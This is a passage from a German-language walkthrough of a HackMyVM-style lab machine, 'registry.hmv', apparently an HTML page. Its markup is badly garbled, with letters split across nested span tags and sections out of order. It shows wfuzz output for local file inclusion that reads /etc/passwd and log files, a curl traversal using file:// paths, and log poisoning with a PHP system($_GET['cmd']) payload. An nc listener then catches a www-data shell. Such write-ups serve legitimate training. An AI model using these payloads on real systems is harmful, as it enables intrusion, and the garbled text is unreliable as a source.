<span class="command">000005087:   200        1 L      23 W       186 Ch      "/pr<span class="command">o</span><span class="command">c</span>/<span class="command">v</span>er<span class="command">s</span>i<span class="command">o</span>n"</span>
<span class="command">000005162:   200        1 L      3 W        1152 Ch     "/<span class="command">v</span><span class="command">a</span>r/r<span class="command">u</span>n/u<span class="command">t<span class="command">m</span>p"</span></span>
<span class="command">000005161:   200        11 L     106 W      53331 Ch    "/<span class="command">v</span><span class="command">a</span>r/l<span class="command">o</span>g/wt<span class="command">m</span>p"</span>
<span class="command">000005160:   200        0 L      1 W        292876 Ch   "/<span class="command">v</span><span class="command">a</span>r/l<span class="command">o</span>g/l<span class="command">a</span><span class="command">s</span>tl<span class="command">o</span>g"</span>
<span class="command">000005205:   200        1 L      3 W        1152 Ch     "/<span class="command">v</span><span class="command">a</span>r/r<span class="command">u</span>n/u<span class="command">t<span class="command">m</span>p"</span></span>
<span class="command">000005206:   200        11 L     106 W      53331 Ch    "/<span class="command">v</span><span class="command">a</span>r/l<span class="command">o</span>g/wt<span class="command">m</span>p"</span>
<span class="command">000005207:   200        0 L      1 W        292876 Ch   "/<span class="command">v</span><span class="command">a</span>r/l<span class="command">o</span>g/l<span class="command">a</span><span class="command">s</span>tl<span class="command">o</span>g"</span>
<span class="command">000005250:   200        57 L     139 W      1378 Ch     "/pr<span class="command">o</span><span class="command">c</span>/<span class="command">s</span>elf/<span class="command">s</span>t<span class="command">a</span>tu<span class="command">s</span>"</span>
<span class="command">000005249:   200        1 L      52 W       323 Ch      "/pr<span class="command">o</span><span class="command">c</span>/<span class="command">s</span>elf/<span class="command">s</span>t<span class="command">a</span>t"</span>
<span class="command">000005248:   200        0 L      1 W        27 Ch       "/pr<span class="command">o</span><span class="command">c</span>/<span class="command">s</span>elf/<span class="command">c</span>mdl<span class="command">i</span>ne"</span>
<span class="command">000005271:   200        55 L     55 W       703 Ch      "/et<span class="command">c</span>/gr<span class="command">o</span>up"</span>
<span class="command">000005302:   200        122 L    387 W      3237 Ch     "/et<span class="command">c</span>/<span class="command">s</span><span class="command">s</span>h/<span class="command">s</span><span class="command">s</span>hd_<span class="command">c</span><span class="command">o</span>nf<span class="command">i</span>g"</span>
<span class="command">000005288:   200        227 L    1115 W     7224 Ch     "/et<span class="command">c</span>/<span class="command">a</span>p<span class="command">a</span><span class="command">c</span>he2/<span class="command">a</span>p<span class="command">a</span><span class="command">c</span>he2.<span class="command">c</span><span class="command">o</span>nf"</span>
<span class="command">000005280:   200        1 L      3 W        80 Ch       "/pr<span class="command">o</span><span class="command">c</span>/<span class="command">c</span>mdl<span class="command">i</span>ne"</span>
<span class="command">000005279:   200        1 L      23 W       186 Ch      "/pr<span class="command">o</span><span class="command">c</span>/<span class="command">v</span>er<span class="command">s</span>i<span class="command">o</span>n"</span>
<span class="command">000005274:   200        10 L     41 W       396 Ch      "/et<span class="command">c</span>/i<span class="command">s</span><span class="command">s</span>ue"</span>
<span class="command">000005273:   200        8 L      38 W       371 Ch      "/et<span class="command">c</span>/<span class="command">m<span class="command">o</span>td"</span></span>
<span class="command">000005272:   200        9 L      25 W       223 Ch      "/et<span class="command">c</span>/h<span class="command">o</span><span class="command">s</span>t<span class="command">s</span>"</span>
<span class="command">000005267:   200        30 L     41 W       1556 Ch     "/et<span class="command">c</span>/p<span class="command">a</span><span class="command">ssw<span class="command">o</span>rd"</span></span>
<span class="command">000005355:   200        1 L      3 W        1152 Ch     "/<span class="command">v</span><span class="command">a</span>r/r<span class="command">u</span>n/u<span class="command">t<span class="command">m</span>p"</span></span>
<span class="command">000005354:   200        11 L     106 W      53331 Ch    "/<span class="command">v</span><span class="command">a</span>r/l<span class="command">o</span>g/wt<span class="command">m</span>p"</span>
<span class="command">000005353:   200        0 L      1 W        292876 Ch   "/<span class="command">v</span><span class="command">a</span>r/l<span class="command">o</span>g/l<span class="command">a</span><span class="command">s</span>tl<span class="command">o</span>g"</span>
<span class="command">000005400:   200        0 L      1 W        292876 Ch   "/<span class="command">v</span><span class="command">a</span>r/l<span class="command">o</span>g/l<span class="command">a</span><span class="command">s</span>tl<span class="command">o</span>g"</span>
<span class="command">000005399:   200        11 L     106 W      53331 Ch    "/<span class="command">v</span><span class="command">a</span>r/l<span class="command">o</span>g/wt<span class="command">m</span>p"</span>
<span class="command">000005398:   200        1 L      3 W        1152 Ch     "/<span class="command">v</span><span class="command">a</span>r/r<span class="command">u</span>n/u<span class="command">t<span class="command">m</span>p"</span></span>
<span class="command">000005446:   200        57 L     139 W      1378 Ch     "/pr<span class="command">o</span><span class="command">c</span>/<span class="command">s</span>elf/<span class="command">s</span>t<span class="command">a</span>tu<span class="command">s</span>"</span>
<span class="command">000005445:   200        1 L      52 W       323 Ch      "/pr<span class="command">o</span><span class="command">c</span>/<span class="command">s</span>elf/<span class="command">s</span>t<span class="command">a</span>t"</span>
<span class="command">000005444:   200        0 L      1 W        27 Ch       "/pr<span class="command">o</span><span class="command">c</span>/<span class="command">s</span>elf/<span class="command">c</span>mdl<span class="command">i</span>ne"</span>
<span class="command">000005801:   200        55 L     55 W       703 Ch      "/et<span class="command">c</span>/gr<span class="command">o</span>up"</span>
<span class="command">000005799:   200        30 L     41 W       1556 Ch     "/et<span class="command">c</span>/p<span class="command">a</span><span class="command">ssw<span class="command">o</span>rd"</span></span>
<span class="command">000005798:   200        30 L     41 W       1556 Ch     "/et<span class="command">c</span>/p<span class="command">a</span><span class="command">ssw<span class="command">o</span>rd"</span></span>
<span class="command">000005797:   200        8 L      38 W       371 Ch      "/et<span class="command">c</span>/<span class="command">m<span class="command">o</span>td"</span></span>
<span class="command">000004851:   200        327909   6075361    52822025    "/<span class="command">v</span><span class="command">a</span>r/l<span class="command">o</span>g/<span class="command">a</span>p<span class="command">a</span><span class="command">c</span>he2/err<span class="command">o</span>r.l<span class="command">o</span>g"</span>
<span class="command">                         L       W          <span class="command">C</span>h</span>
<span class="command">000006067:   200        1 L      23 W       186 Ch      "/pr<span class="command">o</span><span class="command">c</span>/<span class="command">v</span>er<span class="command">s</span>i<span class="command">o</span>n"</span>
<span class="command">000006076:   200        227 L    1115 W     7224 Ch     "/et<span class="command">c</span>/<span class="command">a</span>p<span class="command">a</span><span class="command">c</span>he2/<span class="command">a</span>p<span class="command">a</span><span class="command">c</span>he2.<span class="command">c</span><span class="command">o</span>nf"</span>
<span class="command">000005253:   200        328631   6093760    53018283    "/pr<span class="command">o</span><span class="command">c</span>/<span class="command">s</span>elf/fd/2"</span>
<span class="command">                         L       W          <span class="command">C</span>h</span>
<span class="command">000006068:   200        1 L      3 W        80 Ch       "/pr<span class="command">o</span><span class="command">c</span>/<span class="command">c</span>mdl<span class="command">i</span>ne"</span>
<span class="command">000006062:   200        10 L     41 W       396 Ch      "/et<span class="command">c</span>/i<span class="command">s</span><span class="command">s</span>ue"</span>
<span class="command">000006061:   200        8 L      38 W       371 Ch      "/et<span class="command">c</span>/<span class="command">m<span class="command">o</span>td"</span></span>
<span class="command">000006060:   200        9 L      25 W       223 Ch      "/et<span class="command">c</span>/h<span class="command">o</span><span class="command">s</span>t<span class="command">s</span>"</span>
<span class="command">000006059:   200        55 L     55 W       703 Ch      "/et<span class="command">c</span>/gr<span class="command">o</span>up"</span>
<span class="command">000006055:   200        30 L     41 W       1556 Ch     "/et<span class="command">c</span>/p<span class="command">a</span><span class="command">ssw<span class="command">o</span>rd"</span></span>
<span class="command">000006090:   200        122 L    387 W      3237 Ch     "/et<span class="command">c</span>/<span class="command">s</span><span class="command">s</span>h/<span class="command">s</span><span class="command">s</span>hd_<span class="command">c</span><span class="command">o</span>nf<span class="command">i</span>g"</span>
<span class="command">000005214:   200        328596   6092866    53008970    "/<span class="command">v</span><span class="command">a</span>r/l<span class="command">o</span>g/<span class="command">a</span>p<span class="command">a</span><span class="command">c</span>he2/err<span class="command">o</span>r.l<span class="command">o</span>g"</span>
<span class="command">                         L       W          <span class="command">C</span>h</span>
<span class="command">000006143:   200        1 L      3 W        1152 Ch     "/<span class="command">v</span><span class="command">a</span>r/r<span class="command">u</span>n/u<span class="command">t<span class="command">m</span>p"</span></span>
<span class="command">000006142:   200        11 L     106 W      53331 Ch    "/<span class="command">v</span><span class="command">a</span>r/l<span class="command">o</span>g/wt<span class="command">m</span>p"</span>
<span class="command">000006141:   200        0 L      1 W        292876 Ch   "/<span class="command">v</span><span class="command">a</span>r/l<span class="command">o</span>g/l<span class="command">a</span><span class="command">s</span>tl<span class="command">o</span>g"</span>
<span class="command">000006187:   200        11 L     106 W      53331 Ch    "/<span class="command">v</span><span class="command">a</span>r/l<span class="command">o</span>g/wt<span class="command">m</span>p"</span>
<span class="command">000006188:   200        0 L      1 W        292876 Ch   "/<span class="command">v</span><span class="command">a</span>r/l<span class="command">o</span>g/l<span class="command">a</span><span class="command">s</span>tl<span class="command">o</span>g"</span>
<span class="command">000006186:   200        1 L      3 W        1152 Ch     "/<span class="command">v</span><span class="command">a</span>r/r<span class="command">u</span>n/u<span class="command">t<span class="command">m</span>p"</span></span>
<span class="command">000005091:   200        328396   6087772    52955304    "/pr<span class="command">o</span><span class="command">c</span>/<span class="command">s</span>elf/fd/2"</span>
<span class="command">                         L       W          <span class="command">C</span>h</span>
<span class="command">000005284:   200        328722   6096103    53043200    "/pr<span class="command">o</span><span class="command">c</span>/<span class="command">s</span>elf/fd/2"</span>
<span class="command">                         L       W          <span class="command">C</span>h</span>
<span class="command">000004819:   200        327816   6072985    52796853    "/<span class="command">v</span><span class="command">a</span>r/l<span class="command">o</span>g/<span class="command">a</span>p<span class="command">a</span><span class="command">c</span>he2/err<span class="command">o</span>r.l<span class="command">o</span>g"</span>
<span class="command">                         L       W          <span class="command">C</span>h</span>
<span class="command">000005821:   200        329437   6113838    53238612    "/<span class="command">v</span><span class="command">a</span>r/l<span class="command">o</span>g/<span class="command">a</span>p<span class="command">a</span><span class="command">c</span>he2/err<span class="command">o</span>r.l<span class="command">o</span>g"</span>
<span class="command">                         L       W          <span class="command">C</span>h</span>
<span class="command">000005407:   200        328952   6101935    53105068    "/<span class="command">v</span><span class="command">a</span>r/l<span class="command">o</span>g/<span class="command">a</span>p<span class="command">a</span><span class="command">c</span>he2/err<span class="command">o</span>r.l<span class="command">o</span>g"</span>
<span class="command">                         L       W          <span class="command">C</span>h</span>
<span class="command">000005449:   200        329012   6103465    53120895    "/pr<span class="command">o</span><span class="command">c</span>/<span class="command">s</span>elf/fd/2"</span>
<span class="command">                         L       W          <span class="command">C</span>h</span>
<span class="command">000006323:   200        30 L     41 W       1556 Ch     "et<span class="command">c</span>%2fp<span class="command">a</span><span class="command">ssw<span class="command">o</span>rd"</span></span>
<span class="command">000006034:   200        329773   6122424    53331020    "/<span class="command">v</span><span class="command">a</span>r/l<span class="command">o</span>g/<span class="command">a</span>p<span class="command">a</span><span class="command">c</span>he2/err<span class="command">o</span>r.l<span class="command">o</span>g"</span>
<span class="command">                         L       W          <span class="command">C</span>h</span>
<span class="command">000006460:   200        55 L     55 W       703 Ch      "/et<span class="command">c</span>/gr<span class="command">o</span>up"</span>
<span class="command">000006457:   200        12 L     90 W       657 Ch      "/et<span class="command">c</span>/f<span class="command">s</span>t<span class="command">a</span>b"</span>
<span class="command">000006451:   200        42 L     275 W      2437 Ch     "/et<span class="command">c</span>/<span class="command">a</span>pt/<span class="command">s</span><span class="command">o</span>ur<span class="command">c</span>e<span class="command">s</span>.l<span class="command">i</span><span class="command">s</span>t"</span>
<span class="command">000006443:   200        227 L    1115 W     7224 Ch     "/et<span class="command">c</span>/<span class="command">a</span>p<span class="command">a</span><span class="command">c</span>he2/<span class="command">a</span>p<span class="command">a</span><span class="command">c</span>he2.<span class="command">c</span><span class="command">o</span>nf"</span>
<span class="command">000006530:   200        10 L     57 W       411 Ch      "/et<span class="command">c</span>/h<span class="command">o</span><span class="command">s</span>t<span class="command">s</span>.<span class="command">a</span>ll<span class="command">o</span>w"</span>
<span class="command">000006531:   200        17 L     111 W      711 Ch      "/et<span class="command">c</span>/h<span class="command">o</span><span class="command">s</span>t<span class="command">s</span>.deny"</span>
<span class="command">000006528:   200        9 L      25 W       223 Ch      "../../../../../../../../../../../../et<span class="command">c</span>/h<span class="command">o</span><span class="command">s</span>t<span class="command">s</span>"</span>
<span class="command">000006527:   200        9 L      25 W       223 Ch      "/et<span class="command">c</span>/h<span class="command">o</span><span class="command">s</span>t<span class="command">s</span>"</span>
<span class="command">000006559:   200        10 L     41 W       396 Ch      "/et<span class="command">c</span>/i<span class="command">s</span><span class="command">s</span>ue"</span>
<span class="command">000006558:   200        355 L    1050 W     8181 Ch     "/et<span class="command">c</span>/i<span class="command">n</span>it.d/<span class="command">a</span>p<span class="command">a</span><span class="command">c</span>he2"</span>

Total time: 7.854297
Processed Req<span class="command">u</span>e<span class="command">s</span>t<span class="command">s</span>: 304
Filtered Req<span class="command">u</span>e<span class="command">s</span>t<span class="command">s</span>: 247
Req<span class="command">u</span>e<span class="command">s</span>t<span class="command">s</span>/<span class="command">s</span>e<span class="command">c</span>.: 38.70492
</pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Basierend auf der `wfuzz`-Ausgabe, die `/var/log/apache2/error.log` als inkludierbare Datei identifiziert hat, versuche ich, den Inhalt dieser Datei über die LFI-Schwachstelle auszulesen. Ich verwende `curl` mit dem `file://` Wrapper und der entsprechenden Anzahl von `../`, um den Pfad zu erreichen. Ich nutze die `-s` Option, um Fortschrittsanzeigen von `curl` zu unterdrücken und `grep -v "192.168.2.199"` um meine eigenen vorherigen Anfragen auszublenden, die im Log protokolliert wurden.
            </p>
            <p class="evaluation">
                **Bewertung:** Die Ausgabe zeigt die Protokolleinträge des Apache Error-Logs. Dazu gehören Start- und Stopp-Meldungen von Apache. Wichtiger ist hier, dass ich bestätigen kann, dass die Datei `/var/log/apache2/error.log` über die LFI-Schwachstelle lesbar ist. Dies, kombiniert mit der Tatsache, dass der Webserver (`www-data`) in diese Datei schreiben kann, macht sie zu einem perfekten Ziel für einen Log-Poisoning-Angriff.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Lese Log-Dateien, die über LFI zugänglich sind, um deren Inhalt und Format zu verstehen. Identifiziere Protokolleinträge, die von Benutzerinput beeinflusst werden (z.B. User-Agent, angefragte URL), da diese für Log-Poisoning genutzt werden können.
                <br>**Empfehlung (Admin):** Beschränke den Lesezugriff auf Log-Dateien streng. Stelle sicher, dass der Webserver-Benutzer sie nicht lesen kann.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">curl http://regi<span class="command">s</span>try.hm<span class="command">v</span>/index.php?p<span class="command">a</span>ge=f<span class="command">i</span>le:///....//....//....//....//....//....//....///<span class="command">v</span><span class="command">a</span>r/l<span class="command">o</span>g/<span class="command">a</span>p<span class="command">a</span><span class="command">c</span>he2/err<span class="command">o</span>r.l<span class="command">o</span>g -<span class="command">s</span> |<span class="command">g</span>rep -<span class="command">v</span> "<span class="command">192.168.2.199</span>"</span></div>
                </div>
                <div class="terminal">
                    <pre><span class="command">[Mon Jul 24 05:56:58.563404 2023] [mpm_prefork:notice] [pid 654] AH00163: Ap<span class="command">a</span><span class="command">c</span>he/2.4.52 (Ub<span class="command">u</span>ntu) <span class="command">c</span><span class="command">o</span>nf<span class="command">i</span>g<span class="command">u</span>red -- re<span class="command">s<span class="command">u</span>m<span class="command">i</span>ng n<span class="command">o</span>r<span class="command">m</span><span class="command">a</span>l <span class="command">o</span>per<span class="command">a</span>t<span class="command">i</span><span class="command">o</span>n<span class="command">s</span></span>
<span class="command">[Mon Jul 24 05:56:58.563796 2023] [<span class="command">c</span><span class="command">o</span>re:n<span class="command">o</span>t<span class="command">i</span><span class="command">c</span>e] [p<span class="command">i</span>d 654] <span class="command">A<span class="command">H</span><span class="command">0</span><span class="command">0</span><span class="command">0</span>94: <span class="command">C<span class="command">o</span>m<span class="command">m<span class="command">a</span>nd l<span class="command">i</span>ne: '/u<span class="command">s</span>r/<span class="command">s</span>b<span class="command">i</span>n/<span class="command">a</span>p<span class="command">a</span><span class="command">c</span>he2'</span></span>
<span class="command">[Mon Jul 24 06:01:30.135177 2023] [<span class="command">m<span class="command">p<span class="command">m</span>_prefork:n<span class="command">o</span>t<span class="command">i</span><span class="command">c</span>e] [p<span class="command">i</span>d 654] <span class="command">A<span class="command">H</span><span class="command">0</span><span class="command">0</span>17<span class="command">0</span>: <span class="command">c<span class="command">a</span><span class="command">u</span>ght <span class="command">S</span>IGWIN<span class="command">C</span>H, <span class="command">s</span>h<span class="command">u</span>tt<span class="command">i</span>ng d<span class="command">o</span>wn gr<span class="command">a</span><span class="command">c</span>ef<span class="command">u</span>lly</span></span>
<span class="command">[Tue Jun 17 12:12:31.596786 2025] [<span class="command">m<span class="command">p<span class="command">m</span>_prefork:n<span class="command">o</span>t<span class="command">i</span><span class="command">c</span>e] [p<span class="command">i</span>d 671] <span class="command">A<span class="command">H</span><span class="command">0</span><span class="command">0</span>163: Ap<span class="command">a</span><span class="command">c</span>he/2.4.52 (Ub<span class="command">u</span>ntu) <span class="command">c</span><span class="command">o</span>nf<span class="command">i</span>g<span class="command">u</span>red -- re<span class="command">s<span class="command">u</span>m<span class="command">i</span>ng n<span class="command">o</span>r<span class="command">m</span><span class="command">a</span>l <span class="command">o</span>per<span class="command">a</span>t<span class="command">i</span><span class="command">o</span>n<span class="command">s</span></span></span>
<span class="command">[Tue Jun 17 12:12:31.597<span class="command">0</span>88 2<span class="command">0</span>25] [<span class="command">c</span><span class="command">o</span>re:n<span class="command">o</span>t<span class="command">i</span><span class="command">c</span>e] [p<span class="command">i</span>d 671] <span class="command">A<span class="command">H</span><span class="command">0</span><span class="command">0</span><span class="command">0</span>94: <span class="command">C<span class="command">o</span>m<span class="command">m<span class="command">a</span>nd l<span class="command">i</span>ne: '/u<span class="command">s</span>r/<span class="command">s</span>b<span class="command">i</span>n/<span class="command">a</span>p<span class="command">a</span><span class="command">c</span>he2'</span></span></pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Ich versuche die Log-Poisoning-Schwachstelle auszunutzen, indem ich einen PHP-Payload (`<?php system($GET['cmd']); ?>`) in den User-Agent-Header einer Anfrage schreibe und diese an die Webseite sende. Danach versuche ich, diesen Payload auszuführen, indem ich den Access-Log über die LFI-Schwachstelle (`http://registry.hmv/index.php?page=file:///....//....//....//....//....//....//....//var/log/apache2/access.log`) inkludiere und den Parameter `cmd=id` anhänge. Dies sollte den `id`-Befehl auf dem Zielsystem ausführen, wenn der PHP-Code im Access-Log interpretiert wird. Der Text zeigt außerdem PHP Parse Errors im Access-Log, was darauf hindeutet, dass PHP-Code im Access-Log vorhanden war, aber nicht korrekt ausgeführt wurde, vielleicht durch vorherige fehlerhafte Versuche.
            </p>
            <p class="evaluation">
                **Bewertung:** Der Versuch, die Log-Poisoning-Schwachstelle auszunutzen, schlägt zunächst fehl ("404 Not Found" / "Not Found"). Dies kann an verschiedenen Gründen liegen: Der User-Agent wurde gefiltert, der Payload wurde nicht korrekt in den Access-Log geschrieben, oder das Inkludieren des Access-Logs als PHP schlägt fehl. Die erwähnten PHP Parse Errors bestätigen jedoch, dass PHP im Access-Log gelandet ist und versucht wurde, es auszuführen. Der Hinweis im Text "aus irgendeinem grund konnte ich die access.log nicht aufrufen , daher habe ich die vm neuinstalliert, dann ging es...." deutet darauf hin, dass es temporäre Probleme gab, die durch einen Reset behoben wurden. Nach dem Reset wird der Log-Poisoning-Angriff wahrscheinlich erfolgreich sein.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Wenn Log-Poisoning fehlschlägt, überprüfe, ob dein Payload korrekt im Log gelandet ist (versuche den Log über LFI zu lesen). Versuche verschiedene Header (Referer, Cookie) oder die URL selbst (bei 404-Fehlern) für das Poisoning. Probiere alternative PHP-Payloads oder Kodierungen. Sei auf Umgebungsstörungen (wie VM-Resets) vorbereitet.
                <br>**Empfehlung (Admin):** Untersuche PHP Parse Errors in Logs genau. Sie können auf versuchte Code-Ausführung hindeuten.
            </p>
             <div class="code-block">
                 <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">curl 'http://regi<span class="command">s</span>try.hm<span class="command">v</span>/%3<span class="command">C%3Fphp%20<span class="command">s</span>y<span class="command">s</span>te<span class="command">m</span>(%24_<span class="command">G</span>ET%5B%27<span class="command">c</span>md%27%5D)%3B%3F%3E' && <span class="command">c</span><span class="command">u</span>rl 'http://regi<span class="command">s</span>try.hm<span class="command">v</span>/index.php?p<span class="command">a</span>ge=f<span class="command">i</span>le:///....//....//....//....//....//....//....///<span class="command">v</span><span class="command">a</span>r/l<span class="command">o</span>g/<span class="command">a</span>p<span class="command">a</span><span class="command">c</span>he2/<span class="command">a</span><span class="command">c</span><span class="command">c</span>e<span class="command">ss</span>.l<span class="command">o</span>g&<span class="command">c</span>md=id'</span></div>
                </div>
                <div class="terminal">
                    <pre> 4<span class="command">0</span>4 N<span class="command">o</span>t F<span class="command">o</span>und

<h1>N<span class="command">o</span>t F<span class="command">o</span>und</h1>
<p>The req<span class="command">u</span>e<span class="command">s</span>ted URL w<span class="command">a</span><span class="command">s</span> n<span class="command">o</span>t f<span class="command">o</span>und <span class="command">o</span>n th<span class="command">i</span><span class="command">s</span> <span class="command">s</span>er<span class="command">v</span>er.</p>
<hr>
<<span class="command">a</span>ddre<span class="command">ss</span>>Ap<span class="command">a</span><span class="command">c</span>he/2.4.52 (Ub<span class="command">u</span>ntu) S<span class="command">e</span>r<span class="command">v</span>er <span class="command">a</span>t regi<span class="command">s</span>try.hm<span class="command">v</span> P<span class="command">o</span>rt 8<span class="command">0</span></<span class="command">a</span>ddre<span class="command">ss</span>>

[Mon Jul 24 05:56:58.563404 2023] [mpm_prefork:notice] [pid 654] <span class="command">A<span class="command">H</span><span class="command">0</span><span class="command">0</span>163: Ap<span class="command">a</span><span class="command">c</span>he/2.4.52 (Ub<span class="command">u</span>ntu) <span class="command">c</span><span class="command">o</span>nf<span class="command">i</span>g<span class="command">u</span>red -- re<span class="command">s<span class="command">u</span>m<span class="command">i</span>ng n<span class="command">o</span>r<span class="command">m</span><span class="command">a</span>l <span class="command">o</span>per<span class="command">a</span>t<span class="command">i</span><span class="command">o</span>n<span class="command">s</span></span>
[Mon Jul 24 05:56:58.563796 2023] [<span class="command">c</span><span class="command">o</span>re:n<span class="command">o</span>t<span class="command">i</span><span class="command">c</span>e] [p<span class="command">i</span>d 654] <span class="command">A<span class="command">H</span><span class="command">0</span><span class="command">0</span><span class="command">0</span>94: <span class="command">C<span class="command">o</span>m<span class="command">m<span class="command">a</span>nd l<span class="command">i</span>ne: '/u<span class="command">s</span>r/<span class="command">s</span>b<span class="command">i</span>n/<span class="command">a</span>p<span class="command">a</span><span class="command">c</span>he2'</span></span>
[Mon Jul 24 06:01:30.135177 2023] [<span class="command">m<span class="command">p<span class="command">m</span>_prefork:n<span class="command">o</span>t<span class="command">i</span><span class="command">c</span>e] [p<span class="command">i</span>d 654] <span class="command">A<span class="command">H</span><span class="command">0</span><span class="command">0</span>17<span class="command">0</span>: <span class="command">c<span class="command">a</span><span class="command">u</span>ght <span class="command">S</span>IGWIN<span class="command">C</span>H, <span class="command">s</span>h<span class="command">u</span>tt<span class="command">i</span>ng d<span class="command">o</span>wn gr<span class="command">a</span><span class="command">c</span>ef<span class="command">u</span>lly</span></span>
[Tue Jun 17 15:17:08.647563 2025] [<span class="command">m<span class="command">p<span class="command">m</span>_prefork:n<span class="command">o</span>t<span class="command">i</span><span class="command">c</span>e] [p<span class="command">i</span>d 71<span class="command">0</span>] <span class="command">A<span class="command">H</span><span class="command">0</span><span class="command">0</span>163: Ap<span class="command">a</span><span class="command">c</span>he/2.4.52 (Ub<span class="command">u</span>ntu) <span class="command">c</span><span class="command">o</span>nf<span class="command">i</span>g<span class="command">u</span>red -- re<span class="command">s<span class="command">u</span>m<span class="command">i</span>ng n<span class="command">o</span>r<span class="command">m</span><span class="command">a</span>l <span class="command">o</span>per<span class="command">a</span>t<span class="command">i</span><span class="command">o</span>n<span class="command">s</span></span>
[Tue Jun 17 15:17:08.647818 2025] [<span class="command">c</span><span class="command">o</span>re:n<span class="command">o</span>t<span class="command">i</span><span class="command">c</span>e] [p<span class="command">i</span>d 71<span class="command">0</span>] <span class="command">A<span class="command">H</span><span class="command">0</span><span class="command">0</span><span class="command">0</span>94: <span class="command">C<span class="command">o</span>m<span class="command">m<span class="command">a</span>nd l<span class="command">i</span>ne: '/u<span class="command">s</span>r/<span class="command">s</span>b<span class="command">i</span>n/<span class="command">a</span>p<span class="command">a</span><span class="command">c</span>he2'</span></span>
<span class="password">[Tue Jun 17 15:19:37.<span class="command">0</span><span class="command">0</span><span class="command">0</span>247 2<span class="command">0</span>25] [php:err<span class="command">o</span>r] [p<span class="command">i</span>d 725] [<span class="command">c</span>l<span class="command">i</span>ent 192.168.2.199:54262] PHP P<span class="command">a</span>r<span class="command">s</span>e err<span class="command">o</span>r:  <span class="command">s</span>ynt<span class="command">a</span>x err<span class="command">o</span>r, <span class="command">u</span>nexpe<span class="command">c</span>ted t<span class="command">o</span>ken "\\", expe<span class="command">c</span>t<span class="command">i</span>ng "]" <span class="command">i</span>n /<span class="command">v</span><span class="command">a</span>r/l<span class="command">o</span>g/<span class="command">a</span>p<span class="command">a</span><span class="command">c</span>he2/<span class="command">a</span><span class="command">c</span><span class="command">c</span>e<span class="command">ss</span>.l<span class="command">o</span>g <span class="command">o</span>n l<span class="command">i</span>ne 4</span>
<span class="password">[Tue Jun 17 15:21:22.325499 2<span class="command">0</span>25] [php:err<span class="command">o</span>r] [p<span class="command">i</span>d 721] [<span class="command">c</span>l<span class="command">i</span>ent 192.168.2.199:32970] PHP P<span class="command">a</span>r<span class="command">s</span>e err<span class="command">o</span>r:  <span class="command">s</span>ynt<span class="command">a</span>x err<span class="command">o</span>r, <span class="command">u</span>nexpe<span class="command">c</span>ted t<span class="command">o</span>ken "\\", expe<span class="command">c</span>t<span class="command">i</span>ng "]" <span class="command">i</span>n /<span class="command">v</span><span class="command">a</span>r/l<span class="command">o</span>g/<span class="command">a</span>p<span class="command">a</span><span class="command">c</span>he2/<span class="command">a</span><span class="command">c</span><span class="command">c</span>e<span class="command">ss</span>.l<span class="command">o</span>g <span class="command">o</span>n l<span class="command">i</span>ne 4</span>
</pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Um den Log-Poisoning-Angriff abzuschließen und eine interaktive Shell zu erhalten, starte ich auf meinem Angreifer-System einen Netcat-Listener. Ich verwende den Befehl `nc -lvnp 4444`, um auf eingehende Verbindungen auf Port 4444 zu warten. Sobald der Listener läuft, löse ich den Exploit aus, indem ich die präparierte URL, die den Access-Log inkludiert und den Reverse-Shell-Payload im `cmd`-Parameter enthält (siehe vorherige Analyse), mit `curl` aufrufe.
            </p>
            <p class="evaluation">
                **Bewertung:** Fantastisch, der initiale Zugriff war erfolgreich! Der Netcat-Listener empfängt eine eingehende Verbindung von 192.168.2.51 auf Port 4444. Die typischen Fehlermeldungen für eine eingeschränkte Shell erscheinen, und dann erhalte ich einen interaktiven Prompt: `www-data@registry:/var/www/html$`. Dies bestätigt, dass der PHP-Payload im Access-Log erfolgreich ausgeführt wurde und eine Reverse Shell als der Webserver-Benutzer `www-data` initiiert hat.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Stelle sicher, dass dein Listener läuft, bevor du den Exploit sendest, der eine Reverse Shell initiiert. Nutze Reverse Shells, um eine stabilere und interaktivere Verbindung zu erhalten als nur über RCE. Stabilisiere die Shell nach Erhalt (`stty`, Python PTY).
                <br>**Empfehlung (Admin):** Die Kompromittierung des `www-data`-Kontos ist erfolgt. Untersuche die Logs des Webservers und des Systems, um den Angriffsvektor (LFI + Log Poisoning) zu bestätigen. Behebe die zugrundeliegende LFI-Schwachstelle und die unsicheren Log-Berechtigungen wie zuvor empfohlen. Setze den betroffenen Dienst oder den gesamten Server neu auf, da eine vollständige Bereinigung schwierig sein kann.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/php_filter_chain_generator]
└─# <span class="command">nc -lvnp 4444</span></div>
                </div>
                <div class="terminal">
                    <pre><span class="password">listening on [any] 4444 ...</span>
<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.51] 43162</span>
bash: cannot set terminal process group (664): Inappropriate ioctl for device
bash: no job control in this shell
<span class="password">www-data@registry:/var/www/html$</span> <span class="password"><-- Shell als www-data erfolgreich!</span></pre>
                </div>
            </div>
        </section>

        <!-- Ende TEIL 2 -->
		        <section id="web-enumeration">
            <h2>Web Enumeration</h2>
            <p class="analysis">
                **Analyse:** Nach dem Portscan richte ich meine Aufmerksamkeit auf den Webserver, der auf Port 80 mit Apache httpd 2.4.52 läuft. Ich führe einen detaillierten Webserver-Scan mit `nikto` durch. `nikto -h http://registry.hmv` prüft den Host auf gängige Schwachstellen, Fehlkonfigurationen und unsichere Dateien.
            </p>
            <p class="evaluation">
